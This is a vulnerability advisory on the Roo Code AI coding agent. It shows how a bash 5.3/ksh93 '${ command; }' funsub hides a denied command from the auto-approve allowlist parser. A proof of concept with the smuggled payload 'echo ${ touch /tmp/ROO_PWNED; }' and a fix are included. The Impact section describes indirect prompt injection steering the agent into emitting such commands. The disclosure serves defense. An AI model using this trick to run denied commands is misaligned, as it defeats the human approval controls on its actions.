https://github.com/RooCodeInc/Roo-Code - "This repository was archived by the owner on May 16, 2026. It is now read-only."

## Finding: Auto-approve command allowlist bypassed via a `${ command; }` funsub, which the parser misclassifies as a parameter expansion

Affected Version: commit b867ec9 (v3.53.0)

### Summary

When "always approve execute" is enabled, Roo Code auto-approves agent-proposed shell commands by matching each one against an allowlist and denylist. `parseCommand` masks parameter expansions with the regex `/\$\{[^}]+\}/`, replacing each `${...}` with an opaque placeholder before it looks for commands. That regex also matches `${ command; }`, the command substitution ("funsub") added in bash 5.3 and long present in ksh93, in which the braces enclose a command list, not a parameter. The command inside is masked away and never checked, so `echo ${ touch /tmp/ROO_PWNED; }` is treated as `echo`, matches the `echo` allowlist prefix, and is auto-approved. On a shell that supports funsubs (bash 5.3 or later, or ksh93), the braces run `touch`, so the denied command executes. A legitimate parameter expansion such as `${x:-hi}` receives the same decision but is harmless, so the gate cannot tell the two apart. Confirmed against the `getCommandDecision` and `parseCommand` functions, with execution confirmed on bash 5.3.15.

### Details

The decision is made in `src/core/auto-approval/commands.ts`; `getCommandDecision` calls `parseCommand` (`src/shared/parse-command.ts`) to split the command into sub-commands, then checks each against the allow/deny lists. Before tokenizing, `parseCommand` masks several shell constructs into placeholders. The parameter-expansion masker is (lines 74 to 78):

```ts
// Handle parameter expansions: ${...} patterns (including array indexing)
// This covers ${var}, ${var:-default}, ${var:+alt}, ${#var}, ${var%pattern}, etc.
processedCommand = processedCommand.replace(/\$\{[^}]+\}/g, (match) => {
    parameterExpansions.push(match)
    return `__PARAM_${parameterExpansions.length - 1}__`
})
```

The regex `/\$\{[^}]+\}/` matches any `${ ... }` with no `}` inside. `${ touch /tmp/ROO_PWNED; }` matches it and is replaced with `__PARAM_0__`, so the command the parser checks is `echo __PARAM_0__`, restored to `echo ${ touch /tmp/ROO_PWNED; }`, which begins with the allowlisted prefix `echo` and is auto-approved. The masker assumes every `${...}` is a parameter expansion, whose contents are a variable name and operators — never a command. That assumption is wrong for the funsub form.

`${ command; }` is a command substitution, not a parameter expansion: the braces enclose a command list whose output is captured, exactly like `$(command)`. It is a long-standing ksh93 feature and was added to bash in 5.3 (2025). On such a shell, `echo ${ touch /tmp/ROO_PWNED; }` runs `touch` and substitutes its output. The parser, which predates the bash feature, treats the whole thing as an opaque parameter expansion and never surfaces the command inside.

The masker is correct for a real parameter expansion, which is why the two commands below receive the same `auto_approve` decision but have opposite effects — the gate cannot distinguish a parameter expansion from a funsub:

- `echo ${x:-hi}` — parameter expansion; bash prints `hi`; harmless.
- `echo ${ touch /tmp/ROO_PWNED; }` — funsub; bash runs `touch`.

### PoC

The approval gate depends only on `shell-quote`, so it runs directly against the two unmodified source files at the reported commit. The rest of the repository is a pnpm workspace (`workspace:` protocol deps) and is not needed here:

```bash
git clone https://github.com/RooCodeInc/Roo-Code && (cd Roo-Code && git checkout b867ec9)

# take the two files verbatim, keeping the src/ layout so the internal import resolves
mkdir -p repro/src/core/auto-approval repro/src/shared
cp Roo-Code/src/core/auto-approval/commands.ts repro/src/core/auto-approval/
cp Roo-Code/src/shared/parse-command.ts        repro/src/shared/

cd repro && npm init -y && npm i shell-quote@1.8.3
# save poc.ts (below) here, then run — tsx resolves the extensionless TS imports the source uses:
npx tsx poc.ts
```

```ts
// poc.ts
import { getCommandDecision } from "./src/core/auto-approval/commands"
const ALLOW = ["echo"], DENY = ["touch"]
for (const cmd of [
  "touch /tmp/ROO_PWNED",             // control -> auto_deny    (denied command is caught when bare)
  "echo ${x:-hi}",                    // control -> auto_approve (real parameter expansion; harmless)
  "echo ${ touch /tmp/ROO_PWNED; }",  // BYPASS  -> auto_approve  (funsub; runs touch on bash>=5.3/ksh93)
]) console.log(getCommandDecision(cmd, ALLOW, DENY).padEnd(12), "<-", JSON.stringify(cmd))
```

Results:

```
auto_deny    <- "touch /tmp/ROO_PWNED"
auto_approve <- "echo ${x:-hi}"
auto_approve <- "echo ${ touch /tmp/ROO_PWNED; }"     (BYPASS, should deny)
```

Bash (5.3 or later) confirms the funsub runs while the parameter expansion does not:

```bash
bash --version | head -1                          # e.g. GNU bash, version 5.3.15
bash -c 'echo ${x:-hi}'                            # prints "hi"; parameter expansion -> touch does NOT run
bash -c 'echo ${ touch /tmp/ROO_PWNED; }'          # funsub -> runs touch; /tmp/ROO_PWNED is created
```

Only the funsub creates `/tmp/ROO_PWNED`, yet both received the same `auto_approve` decision.

### Impact

A denied or unlisted command placed inside a `${ ...; }` funsub is masked as a parameter expansion by the approval parser but executed by the shell, defeating the allow/deny control. The realistic trigger is indirect prompt injection: untrusted content the agent reads (a file, web page, repository, or MCP result) steers it into emitting `<allowed prefix> ${ <denied command>; }`, which auto-runs with the agent's auto-execute privileges. Execution requires the invoking shell to support funsubs — bash 5.3 (2025) or later, or ksh93. bash 5.3 is the current release, so up-to-date developer machines are affected; shells without funsub support (for example zsh, or bash 5.2 and earlier) do not execute the command, though the approval bypass in the parser is present regardless of shell.

### Remediation

Do not treat `${ ...; }` as a parameter expansion. The parameter-expansion masker at `src/shared/parse-command.ts` (line 76) should exclude the funsub form — a `${` followed by whitespace introduces a command list, not a parameter — and route it through the same command-substitution handling as `$(...)`, so the command inside is extracted and checked against the allow/deny lists. More robustly, mask constructs by parsing their grammar rather than by a single `${[^}]+}` regex, and treat any `${...}` whose body is not a valid parameter expansion as a command substitution that must be checked (or denied).
